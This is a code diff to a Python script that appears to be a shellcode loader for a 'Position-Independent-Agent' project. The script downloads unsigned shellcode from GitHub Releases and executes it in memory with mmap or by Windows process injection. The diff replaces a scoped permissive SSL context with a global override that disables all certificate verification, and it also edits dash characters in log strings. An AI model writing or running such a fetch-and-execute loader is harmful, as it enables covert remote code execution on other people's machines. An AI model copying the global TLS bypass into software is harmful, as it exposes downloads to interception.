@@ -38,9 +38,13 @@ try:
 except ImportError:
     from urllib2 import Request, urlopen, HTTPError
 
-# SSL verification is disabled at download time via _make_ssl_context() —
-# we download unsigned shellcode from public GitHub Releases, so cert
-# checks add no security and break on hosts with outdated CA stores.
+# Disable ALL SSL verification globally --we download unsigned shellcode from
+# public GitHub Releases, so cert checks add no security and break on hosts
+# with outdated CA stores (Windows 7, Solaris, etc.).
+try:
+    ssl._create_default_https_context = ssl._create_unverified_context
+except AttributeError:
+    pass  # Python < 2.7.9 / 3.4.3: verification not enabled anyway
 
 REPO = "mrzaxaryan/Position-Independent-Agent"
 
@@ -180,37 +184,10 @@ def get_host():
 # Download from GitHub Releases
 # =============================================================================
 
-def _make_ssl_context():
-    """Create a permissive SSL context for maximum compatibility."""
-    _log('dbg', "OpenSSL: %s" % getattr(ssl, 'OPENSSL_VERSION', 'unknown'))
-    try:
-        proto = getattr(ssl, 'PROTOCOL_TLS', None) or ssl.PROTOCOL_SSLv23
-        ctx = ssl.SSLContext(proto)
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        try:
-            ctx.set_ciphers('DEFAULT')
-        except ssl.SSLError:
-            pass
-        return ctx
-    except Exception as e:
-        _log('wrn', "SSL context creation failed: %s" % e)
-        return None
-
-
 def _http_get(url):
     req = Request(url, headers={"User-Agent": "PIA-Loader/1.0"})
-    ctx = _make_ssl_context()
-    if ctx:
-        _log('ok', "SSL context ready")
-    else:
-        _log('wrn', "SSL context unavailable, using system defaults")
     _log('inf', "Connecting to %s ..." % url.split('/')[2])
-    try:
-        resp = urlopen(req, context=ctx) if ctx else urlopen(req)
-    except TypeError:
-        _log('wrn', "urlopen(context=) unsupported, retrying without context")
-        resp = urlopen(req)
+    resp = urlopen(req)
     code = getattr(resp, 'status', None) or getattr(resp, 'code', '?')
     _log('ok', "HTTP %s -- reading response body" % code)
     try:
@@ -249,14 +226,14 @@ def download(platform_name, arch, tag):
     _log('inf', "Validating payload (%d bytes)" % len(data))
     _log('dbg', "Header: %s" % _hexdump(data))
     if len(data) < 64:
-        _log('err', "Payload too small (%d bytes) — not valid shellcode" % len(data))
+        _log('err', "Payload too small (%d bytes) --not valid shellcode" % len(data))
         sys.exit(1)
     header = data[:256]
     if b'<!DOCTYPE' in header or b'<html' in header or b'<HTML' in header:
         _log('err', "Payload is HTML, not shellcode (check network/proxy)")
         sys.exit(1)
 
-    _log('ok', "Payload validated — %d bytes" % len(data))
+    _log('ok', "Payload validated --%d bytes" % len(data))
     return data
 
 
@@ -288,7 +265,7 @@ def run_mmap(shellcode):
     size = len(shellcode)
 
     _log('inf', "mmap: allocating %d bytes (RW, MAP_PRIVATE)" % size)
-    # MAP_PRIVATE is required — the default MAP_SHARED causes mprotect to
+    # MAP_PRIVATE is required --the default MAP_SHARED causes mprotect to
     # silently refuse PROT_EXEC on Solaris (and some hardened Linux kernels).
     mem = mmap.mmap(-1, size, flags=_MAP_PRIVATE, prot=_PROT_READ | _PROT_WRITE)
     mem.write(shellcode)
@@ -313,7 +290,7 @@ def run_mmap(shellcode):
 
 
 # =============================================================================
-# Execution — Windows (process injection)
+# Execution --Windows (process injection)
 # =============================================================================
 
 MEM_COMMIT_RESERVE                 = 0x3000
@@ -541,7 +518,7 @@ def main():
     python_bits = struct.calcsize("P") * 8
 
     # run_mmap executes shellcode in-process, so it must match the Python
-    # interpreter's bitness — not the CPU's.  run_injected (Windows) spawns
+    # interpreter's bitness --not the CPU's.  run_injected (Windows) spawns
     # a native-arch process, so it can use the true OS bitness.
     exec_bits = python_bits if host_os != 'windows' else host_bits
 
